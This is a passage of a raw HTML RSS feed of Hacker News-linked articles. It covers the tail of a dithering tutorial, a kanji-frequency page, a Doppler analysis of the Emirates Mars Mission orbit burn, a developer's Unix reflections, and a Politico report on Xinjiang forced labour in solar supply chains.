<span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>65535</mn><mo>×</mo><mi>s</mi><mi>t</mi><mi>r</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi><mo stretchy="false">)</mo><mo>×</mo><mrow><mo fence="true">(</mo><mfrac><mrow><mi>c</mi><mi>e</mi><mi>l</mi><mi>l</mi><mo>+</mo><mn>1</mn></mrow><mrow><mi>m</mi><mi>a</mi><mi>x</mi></mrow></mfrac><mo>−</mo><mn>0.5</mn><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">(65535 \times strength) \times \left( \frac{cell + 1}{max} - 0.5 \right)</annotation></semantics></math></span></span></span>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>e</mi><mi>l</mi><mi>l</mi></mrow><annotation encoding="application/x-tex">cell</annotation></semantics></math></span></span> is a single cell of the matrix.</p>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi></mrow><annotation encoding="application/x-tex">strength</annotation></semantics></math></span></span> is a percentage, usually a float from <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span></span> to <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1.0</mn></mrow><annotation encoding="application/x-tex">1.0</annotation></semantics></math></span></span>. It’s the amount the matrix will be applied to the
image. The closer to zero it is, the smaller the range of input colors that will be dithered. Colors outside
that range will be quantized. Usually you’ll want a strength of <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1.0</mn></mrow><annotation encoding="application/x-tex">1.0</annotation></semantics></math></span></span>, to apply the matrix and dither fully, but
sometimes reducing it can be useful, to reduce noise in the output image. It is inversely proportional to contrast –
that is, when you reduce the <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi></mrow><annotation encoding="application/x-tex">strength</annotation></semantics></math></span></span>, it is visually similar to increasing the contrast.</p>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi></mrow><annotation encoding="application/x-tex">strength</annotation></semantics></math></span></span> can also be negative, from <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span></span> to <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mn>1.0</mn></mrow><annotation encoding="application/x-tex">-1.0</annotation></semantics></math></span></span>. This is useful in certain cases where the matrix usually
makes things bright, like what Surma describes with Bayer matrices.</p>

<p>Note that <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>65535</mn></mrow><annotation encoding="application/x-tex">65535</annotation></semantics></math></span></span> is multiplied by <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi></mrow><annotation encoding="application/x-tex">strength</annotation></semantics></math></span></span> because the colours in my code are in the range <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>65535</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0, 65535]</annotation></semantics></math></span></span>. If yours
are different you can change that number.</p>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>a</mi><mi>x</mi></mrow><annotation encoding="application/x-tex">max</annotation></semantics></math></span></span> is the value the entire matrix is divided by. It represents the maximum value of the matrix, and normalizes
it by dividing. Usually this is the product of the dimensions of the matrix. It can also be the
largest value in the matrix plus one.</p>

<p>The result of applying this operation to each cell of the matrix is a new, precalculated matrix, which can be added
to a pixel’s colour value for dithering. Adding 0.5 does not need to happen in this case. In my library, I call the
function that does this <code>convThresholdToAddition</code>, because that’s essentially the purpose of this – converting
a threshold matrix into one that can be used for addition.</p>

<p><strong>Note:</strong> This is designed for matrices that range from <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span></span> to <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>a</mi><mi>x</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">max - 1</annotation></semantics></math></span></span>. If you’re using a matrix you found that
starts at <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span></span>, you’ll usually just want to subtract one from each value when you program it, then apply the operation
I described above.</p>

<h3 id="using-a-modified-matrix">Using a modified matrix</h3>

<p>Now that you’ve modified the matrix so it can be used for addition, it needs to be applied to the image. This is pretty
simple. Use modulus so the matrix values are tiled across the image, and add the same value in the R, G, and B channels.
If you’re using a grayscale image you can just apply it in the one channel, or still use RGB. Since the same value is
being added it doesn’t make much of a difference. Like always, make sure to clamp the values to the proper colour range.</p>

<p>Doing all of this definitely works with colour images, but it’s not the greatest. Here’s an example, where the palette
is red, green, and black.</p>

<section>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/peppers.png">
<figcaption>
Original image
</figcaption>
</figure>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/bayer_16x16_red-green-black.png">
<figcaption>
Ordered dithering (Bayer 16x16)
</figcaption>
</figure>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/floyd-steinberg_red-green-black.png">
<figcaption>
Error diffusion dithering (Floyd-Steinberg)
</figcaption>
</figure>

</section>

<p>Here it is where the palette is red, green, black, and yellow.</p>

<section>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/bayer_16x16_red-green-yellow-black.png">
<figcaption>
Ordered dithering (Bayer 16x16)
</figcaption>
</figure>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/floyd-steinberg_red-green-yellow-black.png">
<figcaption>
Error diffusion dithering (Floyd-Steinberg)
</figcaption>
</figure>

</section>

<p>As you can see, it doesn’t really emulate any of the yellow in the first example, while Floyd-Steinberg can. Once yellow is added
to the palette it looks pretty good though.</p>

<h2 id="error-diffusion-dithering">Error diffusion dithering</h2>

<p>Error…</p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.makeworld.gq/2021/02/dithering.html">https://www.makeworld.gq/2021/02/dithering.html</a></em></p>]]>
            </description>
            <link>https://www.makeworld.gq/2021/02/dithering.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26120631</guid>
            <pubDate>Sat, 13 Feb 2021 01:29:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[With 777 Kanji, 90% Coverage of Kanji in the Wild]]>
            </title>
            <description>
<![CDATA[
Score 52 | Comments 26 (<a href="https://news.ycombinator.com/item?id=26120559">thread link</a>) | @sova
<br/>
February 12, 2021 | https://japanesecomplete.com/777 | <a href="https://web.archive.org/web/*/https://japanesecomplete.com/777">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <div>
            
            
            <p data-wow-delay="0.5s">With 777  of the most frequent kanji, one has 90.0% coverage of Kanji in the wild!</p>
            <p data-wow-delay="1.55s">With 1477 kanji one has 98.0% coverage, and with 2477 characters one has 99.9% coverage</p>
            <p data-wow-delay="3.05s">Based on the Balanced Corpus of Contemporary Japanese from 2011, these 777 kanji characters are the most frequent kanji in the Japanese language today.  By learning these kanji first, and in this order, one is maximizing their learning efficacy and will immediately see these kanji in native Japanese media, as they occur the most often across all domains (literature, poetry, science, politics, technology, television, novels, and more).</p>

          </div>
        </div></div>]]>
            </description>
            <link>https://japanesecomplete.com/777</link>
            <guid isPermaLink="false">hacker-news-small-sites-26120559</guid>
            <pubDate>Sat, 13 Feb 2021 01:15:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Emirates Mars Mission Moi Burn Observed in Bochum]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26119770">thread link</a>) | @parsecs
<br/>
February 12, 2021 | https://destevez.net/2021/02/emirates-mars-mission-moi-burn-observed-in-bochum/ | <a href="https://web.archive.org/web/*/https://destevez.net/2021/02/emirates-mars-mission-moi-burn-observed-in-bochum/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-9647">

	

	<div>
		
<p>A few days ago, <a href="https://www.emiratesmarsmission.ae/">Emirates Mars Mission (Hope)</a>, and <a href="https://destevez.net/tag/tianwen/">Tianwen-1</a> performed their Mars orbit injection burn (MOI). <a href="https://amsat-dl.org/">AMSAT-DL</a> made a livestream for each of the two events, showing the X-band signals of the spacecraft as received with the <a href="https://amsat-dl.org/en/20-meter-antenna/">20m antenna at Bochum</a>.</p>



<p>In the case of Tianwen-1 the signal was pretty strong even while the spacecraft was on the low gain antenna, and we could clearly see the <a href="https://youtu.be/1myQ5tIig0w?t=6593">change in Doppler rate as the thrusters fired up</a>. However, in the case of Emirates Mars Mission the signal <a href="https://youtu.be/413DdMua8ec?t=2641">disappeared as soon as the spacecraft switched to the low gain antenna</a>. In fact <a href="https://eyes.nasa.gov/dsn/dsn.html">DSN Now</a> reported a received power of -155 dBm with the 34m DSS55. That was a large drop from the -118 dBm that it was reporting with the high gain antenna. Therefore, nothing could be seen in the livestream waterfall until the spacecraft returned to the high gain antenna, well after the manoeuvre was finished.</p>



<p>Nevertheless, a weak trace of the carrier was still present in the livestream audio, and it could be seen by appropriate FFT processing, for example with <a href="https://github.com/miek/inspectrum">inspectrum</a>. I put up a <a href="https://twitter.com/ea4gpz/status/1359152918004461574">couple</a> of <a href="https://twitter.com/ea4gpz/status/1359161368289701888">tweets</a> showing this, but at the moment I wasn’t completely sure if what I was seeing was the spacecraft’s signal or some interference. After the livestream ended, I’ve been able to analyse the audio more carefully and realize that not only this weak signal was in fact the Hope probe, but that the start of the burn was recorded in perfect conditions.</p>



<p>In this post I’ll show how to process the livestream audio to clearly show the change in drift rate at the start of the burn and measure the acceleration of the spacecraft.</p>



<p>The idea with this post is that anyone can reproduce what I’m going to show. After all, the only data I’m using is the audio of a livestream that is recorded in Youtube. For convenience, I include with my code the segment of data I’m using, which is a 5 minute segment that starts 7850 seconds into the audio of the full video. If you want to start from scratch, you can use any webpage or application to download the audio of the full video, and work with that. In my case I used a webpage to download the audio in 320kbps MP3 format, then converted it to an 8ksps WAV file, and used <a href="https://www.scipy.org/">SciPy</a> to read the WAV file and extract the 5 minute segment.</p>



<p>In the figure below you can see the waterfall of the first minute of the 5 minute clip I cut. The spacecraft signal can be seen as faint diagonal lines between 700 and 800 Hz. They are quite weak and have some fading, but hopefully you can see them.</p>



<figure><a href="https://destevez.net/wp-content/uploads/2021/02/emm_start.png"><img width="644" height="438" src="https://destevez.net/wp-content/uploads/2021/02/emm_start-644x438.png" alt="" srcset="https://destevez.net/wp-content/uploads/2021/02/emm_start-644x438.png 644w, https://destevez.net/wp-content/uploads/2021/02/emm_start-300x204.png 300w, https://destevez.net/wp-content/uploads/2021/02/emm_start.png 730w" sizes="(max-width: 644px) 100vw, 644px"></a></figure>



<p>There is something that is convenient to remark about the Doppler correction system that was used at Bochum for the livestreams. First, the system used the trajectory of the the spacecraft, ignoring the burn, to compute the expected Doppler. Therefore, the expected Doppler computation would be quite good before the burn started, but as soon as the thrusters fired it would diverge more and more from reality.</p>



<p>Second, rather than constantly adjusting the tuning to correct for Doppler and keep the signal exactly centred, the system performed discrete jumps of fixed size with the goal of keeping the signal inside a certain band, roughly 350 Hz wide. This had the effect of creating a sawtooth wave in the waterfall and the audio. As the signal arrived to one edge of this imaginary band, the Doppler correction performed a frequency jump to put the signal at the other edge of the band.</p>



<p>This can be seen quite clearly in the livestream of Tianwen-1. At the <a href="https://youtu.be/1myQ5tIig0w?t=0">beginning of the livestream</a>, the drift rate was quite low, since the spacecraft was well away from periapsis. Therefore, the period of the sawtooth was long. As the spacecraft approached periapsis and the drift rate increased, the period of the sawtooth <a href="https://youtu.be/1myQ5tIig0w?t=4667">kept reducing</a> until it was quite short <a href="https://youtu.be/1myQ5tIig0w?t=6023">right before the burn</a>. However, note that the amplitude of the sawtooth (this is, the width of this imaginary frequency band) is always the same.</p>



<p>The next figure shows the waterfall of the audio when the burn starts. It is a bit difficult to see, but hopefully you’ll be able to see two or three lines at the left around 800 Hz, and then a couple of lines going up in steps and with less slope, near the middle of the image.</p>



<figure><a href="https://destevez.net/wp-content/uploads/2021/02/emm_burn.png"><img width="644" height="438" src="https://destevez.net/wp-content/uploads/2021/02/emm_burn-644x438.png" alt="" srcset="https://destevez.net/wp-content/uploads/2021/02/emm_burn-644x438.png 644w, https://destevez.net/wp-content/uploads/2021/02/emm_burn-300x204.png 300w, https://destevez.net/wp-content/uploads/2021/02/emm_burn.png 730w" sizes="(max-width: 644px) 100vw, 644px"></a></figure>



<p>When the burn starts, the drift rate increases (i.e., changes from negative to less negative), since the retrograde burn accelerated the spacecraft towards Earth. As the Doppler correction keeps tuning in steps to correct for a more negative drift rate, we get steps upwards. This is the same that happened at the <a href="http://youtu.be/1myQ5tIig0w?t=6593">start of the burn of Tianwen-1</a>. In that case the drift rate became almost zero, and then positive, since the thrust-to-mass ratio of Tianwen-1 is higher than that of Hope.</p>



<p>The resolution of the plots shown above, and those that come later is 0.98 Hz per FFT bin (FFT size of 8192 with a sample rate of 8ksps) and 64ms per time step (due to the use of overlapping FFT, and an advance of 512 samples per FFT).</p>



<p>In what follows, the idea is to undo the Doppler correction done at Bochum to join back the pieces of the sawtooth wave and also correct for the drift rate in order to get a signal of constant frequency that we may see clearly in a spectrum plot. To do this, we just need to create a sawtooth that has the same (or almost the same) phase, amplitude and period as the one that the Doppler correction created, and then use that sawtooth to control the frequency of a local oscillator with which we mix the audio signal. I have adjusted the parameters of the sawtooth by hand until I obtained something where the resulting signal before the start of the burn had a constant frequency and had no (or very brief) jumps.</p>



<p>The result of this correction can be seen below. We see the signal before the burn as a flat line at constant frequency, slightly above 800 Hz, and then the signal rising up as the burn starts. The vertical white line marks the moment in which the start of the burn happens, which is at 184.96 seconds into this 5 minute segment. The right panel contains the spectrum plot of the data in the left of the waterfall (to the left of the white line). The signal can be seen very clearly, with an (S+N)/N of about 5dB, which would give an estimated CN0 on the order of 3 dBHz.</p>



<figure><a href="https://destevez.net/wp-content/uploads/2021/02/emm_before_burn.png"><img width="644" height="427" src="https://destevez.net/wp-content/uploads/2021/02/emm_before_burn-644x427.png" alt="" srcset="https://destevez.net/wp-content/uploads/2021/02/emm_before_burn-644x427.png 644w, https://destevez.net/wp-content/uploads/2021/02/emm_before_burn-300x199.png 300w, https://destevez.net/wp-content/uploads/2021/02/emm_before_burn-768x510.png 768w, https://destevez.net/wp-content/uploads/2021/02/emm_before_burn.png 856w" sizes="(max-width: 644px) 100vw, 644px"></a></figure>



<p>If we now change the drift rate correction, we can make flat the signal after the burn. We see that the drift rate is not constant, but rather it increases slightly with time, so it is not possible to find a drift rate that makes the line totally flat. I have chosen a drift rate that makes the line flat at approximately 20 seconds after the start of the burn. The  right panel shows the spectrum of the right part of the waterfall (after the white line). Again, we have some 5 dB of (S+N)/N.</p>



<figure><a href="https://destevez.net/wp-content/uploads/2021/02/emm_after_burn.png"><img width="644" height="427" src="https://destevez.net/wp-content/uploads/2021/02/emm_after_burn-644x427.png" alt="" srcset="https://destevez.net/wp-content/uploads/2021/02/emm_after_burn-644x427.png 644w, https://destevez.net/wp-content/uploads/2021/02/emm_after_burn-300x199.png 300w, https://destevez.net/wp-content/uploads/2021/02/emm_after_burn-768x510.png 768w, https://destevez.net/wp-content/uploads/2021/02/emm_after_burn.png 856w" sizes="(max-width: 644px) 100vw, 644px"></a></figure>



<p>We have seen how by correcting the drift rate the “corner” of the Doppler curve, which marks the exact moment in which the thrusters started firing, can seen in the waterfall, whereas with the waterfall of the original audio signal it was impossible to see this corner. The moment in which the corner happens corresponds to 2:13:54.96 into the video, which by looking at the timestamps that appear in the screen shown in the video we can associate with 15:41:38 UTC (with a precision of perhaps one or two seconds). Since the light-time delay for this burn was 637 seconds, this means that the burn started at 15:31:01 UTC. This matches the official report of a start at 15:30 UTC, because it is possible that ullage motors fired one minute before the main burn, as we saw in <a href="https://destevez.net/2020/08/tianwen-1-tcm-1/">Tianwen-1’s TCM-1</a>.</p>



<p>The drift rate before the burn is -19.5 Hz/s, and when the burn starts it changes to -8 Hz/s. Such a drift rate change gives a line-of-sight acceleration of -0.41 m/s². This is just the projection of the acceleration vector onto the line-of-sight. In order to compute the full acceleration, we assume that it happened along the velocity vector of the spacecraft (with respect to Mars), and compute the projection of the unit velocity vector and the unit line-of-sight vector to Earth at the start of the burn. This computation ignores light-time delays, but is good enough for our purposes, since the line-of-sight vector changes slowly enough. The projection is 0.86.</p>



<p>This means that we only see 86% of the total acceleration in the Doppler drift rate. Therefore, the total acceleration must have been around -0.48 m/s². This contrasts to the theoretical acceleration of -0.58 m/s² that 720 N of thrust (since the spacecraft has 6x 120 N thrusters) applied to 1250 kg of mass produce (here the mass comes from a dry mass of 550 kg and 700 kg of fuel, assuming that the probe already spent in mid-course corrections 100 kg of its initial 800 kg).</p>



<p>Working backwards, we see that the measured acceleration of -0.48 m/s² would correspond to a thrust of 594 N. In fact, while I <a href="https://twitter.com/ea4gpz/status/1359081278079987712">worked out the planning of the manoeuvre on Twitter</a>, I noticed that the publicly stated burn length of 27 minutes was way too long to achieve the target orbit with a thrust of 720 N. To have a burn of 27 minutes that gave me the required apoapsis altitude I had to use a thrust of 658 N.</p>



<p>Note that all these calculations about the acceleration are just estimates, since we don’t know exactly the mass of the spacecraft, and our estimate of 1250 kg could be wrong by up to 10%. In any case, I think it is always good to go through these calculations to show what can be achieved with simple Doppler measurements and to check that the signal we observed matches what we expected.</p>



<p>The calculations and plots in this post have been done in <a href="https://github.com/daniestevez/jupyter_notebooks/blob/master/EMM/MOI/Bochum%20MOI%20recording.ipynb">this Jupyter notebook</a>. The data file with the 5 minute segment of the livestream audio is included in the same repository. The results that I have shown are intended to be easily reproducible. It is possible to run the notebook with the supplied data or to start from scratch by downloading the audio from the livestream video on Youtube.</p>



<p>Many thanks and great work to all the AMSAT-DL team for organizing the …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://destevez.net/2021/02/emirates-mars-mission-moi-burn-observed-in-bochum/">https://destevez.net/2021/02/emirates-mars-mission-moi-burn-observed-in-bochum/</a></em></p>]]>
            </description>
            <link>https://destevez.net/2021/02/emirates-mars-mission-moi-burn-observed-in-bochum/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26119770</guid>
            <pubDate>Fri, 12 Feb 2021 23:23:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Screenshots from Developers: 2002 vs. 2015]]>
            </title>
            <description>
<![CDATA[
Score 24 | Comments 2 (<a href="https://news.ycombinator.com/item?id=26119769">thread link</a>) | @beliu
<br/>
February 12, 2021 | https://anders.unix.se/2015/12/10/screenshots-from-developers--2002-vs.-2015/ | <a href="https://web.archive.org/web/*/https://anders.unix.se/2015/12/10/screenshots-from-developers--2002-vs.-2015/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>How things have (and have not changed). I'm still a command-line junkie with at least two xterm windows open. I'm still using a 3x3 virtual desktop. However, instead of fvwm, it is now LXDE. I've also switched from FreeBSD to Linux and I'm running Lubuntu as my distribution.</p>

<p>There are a lot of indispensable GUI tools that I use. These include Firefox, lyx, Gimp, KeepassX, Shutter, viking, dia, Wireshark, calibre, audacity, Handbrake and VLC. But where possible I still prefer to script things. My main development languages are still shell, Perl and C.</p>

<p>My shell is now bash. The vi keystrokes are burned into my fingertips and, as long as vim can be ported to new systems, that will be my text editor until I pass on. My mail client is now mutt (definitely not a web client) and my mail is stored locally, not on someone else's server.</p>

<p>The only issue I have is that, since a job change, I now have to deal with Windoze things. Thus, I have VirtualBox, libreoffice and Wine to help me do that.</p>

<p>I started with Unix on a Pyramid 90x. I now have a smart phone that blows the 90x out of the water on performance, RAM and storage. But I'm so very happy that, somewhere down underneath, there is still a Bourne shell and an operating system that does open(), close(), read(), write(), fork() and exec()!</p>
</div></div>]]>
            </description>
            <link>https://anders.unix.se/2015/12/10/screenshots-from-developers--2002-vs.-2015/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26119769</guid>
            <pubDate>Fri, 12 Feb 2021 23:23:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Fears over China’s Muslim forced labor loom over EU solar power]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26119752">thread link</a>) | @ericdanielski
<br/>
February 12, 2021 | https://www.politico.eu/article/xinjiang-china-polysilicon-solar-energy-europe/ | <a href="https://web.archive.org/web/*/https://www.politico.eu/article/xinjiang-china-polysilicon-solar-energy-europe/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
									
							<div id="amazon-polly-audio-table">
				<p>Press play to listen to this article</p>
				
		</div>
<p>Nearly every solar power panel sold in the European Union has its origins in China’s <a href="https://www.politico.com/news/2020/07/24/china-uighurs-europe-sanctions-381080" target="_blank">oppressed Xinjiang region</a>.</p>



<p>The solar industry and Brussels lawmakers argue Europe’s renewable energy push should not come at a human cost amid long-standing international concern over reports China has <a href="https://www.reuters.com/article/us-china-rights-un-idUSKBN1KV1SU" target="_blank">detained 1 million people</a> with Muslim backgrounds in camps in Xinjiang and is putting them to work.</p>



<p>“Everybody knows what’s going on in China, and when facilities are based there you have to accept that there’s a high possibility that forced labor will be used,” said Milan Nitzschke, president of <a href="https://www.prosun.org/en/mission-en/" target="_blank">EU ProSun</a>, an alliance of solar businesses seeking to promote sustainable, solar manufacturing based in the EU.&nbsp;</p>



<p>While the U.S. has already rolled out sanctions against products such as cotton and tomatoes originating from Xinjiang, the European Commission has avoided confronting China with any trade measures. </p>



<p>It has fallen to lawmakers in the European Parliament to try to push Brussels to implement trade bans, on all industries including solar panels, if companies are implicated in human rights abuses.</p>



<p>“Import bans need to complement as a last resort if forced labor is involved in the production, like in Xinjiang," said Green MEP Anna Cavazzini.</p>



<h3>Suspicions about every panel</h3>



<p>For the past decade Beijing has been carrying out a campaign to <a href="https://www.politico.eu/?p=1256994">detain and “reeducate”</a> the Muslim-majority population of the Xinjiang region.</p>



<p>Human rights groups have alerted that state-run reeducation centers <a href="https://www.politico.eu/?p=1408155">double as forced labor camps</a>, with detained people obliged to work in low-skilled, labor-intensive sectors such as cotton picking. But recent reports out of the region suggest the Xinjiang government has also been focusing on “upskilling” the workforce and putting them to work in more specialized sectors.</p>



<p>That’s of particular concern to the global solar industry given Xinjiang’s outsized role in the production of <a href="https://www.politico.eu/?p=62601">polysilicon</a>, a material used to make photovoltaic (PV) cells.&nbsp;</p>



<p>“Nearly every silicon-based solar module — at least 95 percent of the market — is likely to have some Xinjiang silicon in,” said Jenny Chase, head of solar analysis at BloombergNEF.</p>



<p>Industry analyst Johannes Bernreuter added that last year roughly 45 percent of the global supply of solar-grade polysilicon came from the region.&nbsp;</p>



<p>Raw polysilicon is transported to factories — usually outside Xinjiang — and melted into cylinders, known as ingots. Because it’s blended with polysilicon produced in other regions, it’s difficult to trace material that could potentially come from forced labor camps in Xinjiang, Chase and Bernreuter said.</p>



<p>For any single solar panel “the mathematical probability is relatively high" it has some material produced in the province, said Bernreuter.</p>



<h3>An open secret</h3>



<p>Beijing <a href="https://www.reuters.com/article/china-cotton-forced-labour-trfn-idUSKBN28P2CM" target="_blank">insists</a> the camps — which it calls “vocational training facilities” — are simply “helping people of all ethnic groups secure stable employment” and argues that this is “entirely different from forced labor.”&nbsp;</p>



<p>The China Photovoltaic Industry Association <a href="http://www.chinapv.org.cn/association_news/922.html" target="_blank">said</a> accusations of forced labor in Xinjiang were ”the lie of the century fabricated by several institutions and people from Western countries.”</p>



<p>In Europe, industry players said the potential use of forced labor to produce material included in solar panels imported into the EU was an open secret.</p>



<p>Industry group SolarPower Europe said it was investigating the situation in Xinjiang with its membership and looking at different options to ensure no forced labor was used in the PV manufacturing process.&nbsp;</p>



<p>“We cannot accept that such practices take place in the solar PV sector, which is a leader in sustainability and a key enabler of the energy transition,” said SolarPower Europe CEO Walburga Hemetsberger.</p>



<p>The group said its members were using supply chain management guidelines, certifications and standards to ensure that forced labor was not used, and that it was evaluating how to encourage best practices across the industry.</p>



<h3>Distancing measures</h3>



<p>If the EU’s solar sector wants to distance itself from solar components manufactured under questionable circumstances in Xinjiang, it would have several ways of doing so.</p>



<p>Bloomberg NEF’s Chase said one option would be to continue accepting components made with polysilicon from China, but insisting that material produced in Xinjiang be exempted from the mix blended in factories.</p>



<p>“There’s plenty of non-Xinjiang polysilicon,” Chase said — around a quarter of the global market in 2021 is expected to come from the U.S. and the EU. But she said enforcing the exclusion would be complicated and likely make little difference for the plight of any workers. </p>



<p>Xinjiang polysilicon would simply shift to the domestic market and customers in the EU and the U.S. “will pay an almost unnoticeable amount more for modules,” said Chase. “Honestly, it is unlikely to be a big deal for solar, but good news for companies that make silicon outside Xinjiang.”</p>



<p>Perhaps unsurprisingly, European manufacturers believe the answer is repatriating the industry back to the EU and using tariffs if necessary.</p>



<p>“Solar components can be produced in Europe,” EU ProSun’s Nitzschke said. “The companies making them were here until 2012 but they went bankrupt when the tariffs used to address Chinese overproduction and public financing were removed, allowing their companies to undercut us in terms of price.”</p>



<p>Nitzschke argued the EU should revise its trade deals and ensure that the same standards on human rights and forced labor that apply in Europe be extended to imported products. “We can’t have a level playing field if there’s ethical leakage, and you could prevent it by applying tariffs to products that don’t meet our standards.”</p>



<p>SolarPower Europe’s Hemetsberger said she didn’t favor trade tariffs due to their often counterproductive effect on European solar growth. "The best way of ensuring that imported goods abide by strict human rights protocols and ethical standards is improving the level of transparency of the global value chain so that EU-based suppliers can make informed decisions."</p>



<p>The European Commission has said the EU’s solar capacity needs to <a href="https://ec.europa.eu/clima/policies/strategies/2030_en#:~:text=2030%20climate%20and%20energy%20framework%20%2D%20existing%20ambition,32.5%25%20improvement%20in%20energy%20efficiency" target="_blank">grow five-fold by 2030</a> to meet its climate targets. Hemetsberger said there was a “solar manufacturing renaissance” underway in Europe.</p>



<p>“Nearly all areas of the supply chain can be produced in Europe,” said Gunter Erfurt, CEO of <a href="https://www.meyerburger.com/en/company/about-meyer-burger/management/" target="_blank">Meyer Burger</a>, a Swiss-German solar module production company that aims to reestablish solar’s industrial supply chain on the Continent, pointing out that solar-grade polysilicon is <a href="https://www.wacker.com/cms/en-us/about-wacker/wacker-at-a-glance/profile-and-organization/wacker-polysilicon.html" target="_blank">already produced</a> at several sites in Germany.&nbsp;</p>



<p>“I have a lot of respect for the Chinese strategy because 10 years ago they understood what Europe is still struggling to grasp: that solar is the future,” he said. “EU leaders speak of batteries, electric mobility, hydrogen … But where is the electricity to produce those things supposed to come from? We are already the technological frontrunners, what we need now is financing to bring production back.”&nbsp;</p>



<h3>Growing pressure on Brussels</h3>



<p>Solar panels are yet another example of goods made with forced labor entering the EU market, raising <a href="https://www.politico.eu/?p=1572638">criticisms from lawmakers and NGOs</a>.&nbsp;</p>



<p>Joerg Wuttke, president of the EU Chamber of Commerce in China, expects the EU to step up scrutiny of imports from Xinjiang, including solar power panels.</p>



<p>“The pressure is piling on the Commission and member states that they have to use unilateral means to send China a message, such as screening of imported products,” said Wuttke.&nbsp;</p>



<p>Brussels <a href="https://www.politico.eu/article/eu-china-inestment-agreement-soft-approach-odds-us/">is taking its time</a> when its comes to tackling goods made with forced labor.&nbsp;</p>



<figure><img loading="lazy" width="1024" height="614" src="https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-1024x614.jpg" alt="" srcset="https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-1024x614.jpg 1024w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-300x180.jpg 300w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-768x461.jpg 768w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-1536x921.jpg 1536w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-714x428.jpg 714w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-406x242.jpg 406w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-1160x696.jpg 1160w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-380x228.jpg 380w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-115x69.jpg 115w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-200x120.jpg 200w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-433x260.jpg 433w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-60x36.jpg 60w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-1200x720.jpg 1200w, 